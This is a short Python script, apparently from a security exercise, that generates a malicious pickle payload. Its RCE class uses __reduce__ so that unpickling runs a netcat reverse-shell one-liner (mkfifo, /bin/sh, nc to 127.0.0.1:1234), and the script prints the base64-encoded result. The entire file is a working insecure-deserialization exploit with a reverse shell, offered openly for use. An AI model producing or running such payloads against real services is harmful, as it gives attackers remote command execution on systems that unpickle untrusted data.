"""
pickler - a program that creates reverse shells in a pickle

Based on sample code from
https://davidhamann.de/2020/04/05/exploiting-python-pickle/

Ljubljtube:
https://www.youtube.com/watch?v=HsZWFMKsM08
"""

import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


def main():
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))


if __name__ == "__main__":
    main()
